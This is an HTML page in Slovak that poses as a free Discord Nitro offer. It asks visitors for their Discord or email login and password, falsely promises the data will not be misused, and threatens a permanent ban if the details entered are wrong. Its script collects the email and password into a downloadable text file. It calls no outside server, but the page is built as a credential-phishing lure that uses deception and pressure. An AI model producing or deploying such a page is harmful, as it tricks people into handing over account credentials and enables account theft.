<!DOCTYPE html>
<html lang="sk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord nitro</title>
     <img src="https://nitro-store.weeblysite.com/uploads/b/f709a7d119b15cfa201d25a334f591a9c400d1699dfa1d4d661f0f83b1aeb42b/d30750eda6c30bba9295ad629961420555c05496_1658414432.png?width=400" alt="Discord Nitro logo.PNG"> 
     <p style="background-image: url('https://fossbytes.com/wp-content/uploads/2022/03/what-is-discord-nitro.jpg');"> 
    <script>
        function downloadCredentials() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const blob = new Blob([`Email: ${email}\nHeslo: ${password}`], { type: 'text/plain' });
            const link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = 'Nitro-file.txt';
            link.click();
        }
    </script>
</head>
<body>
    <h1>Zadajte vase prihlasovacie udaje od platformy Discord/Mail* (Vase udaje nebudu zneuzite!)</h1>
    <form onsubmit="event.preventDefault(); downloadCredentials();">
        <label for="email">Email:</label>
        <input type="email" id="email" required>
        <br>
        <label for="password">Heslo:</label>
        <input type="password" id="password" required>
        <br>
        <label for="length">Na akú dĺžku chcete nitro:</label>
        <input type="text" id="length">
        <br>
        <label for="length">Vas nickname na Discorde**:</label>
        <input type="text" id="length">
        <br>
        <button type="submit">Získať</button>
    </form>
    <br>
    <br>
    <br>
    <br>
    <br>
    <h3>*Zadajte platne udaje! Ak budu udaje nespravne, vas ucet z dovodu pokusu o zneuzitie bude permanentne zablokovany.<h3>
    <h3>**Len pokial ste sa rozhodly zadat Discord udaje<h3>
</body>
</html>
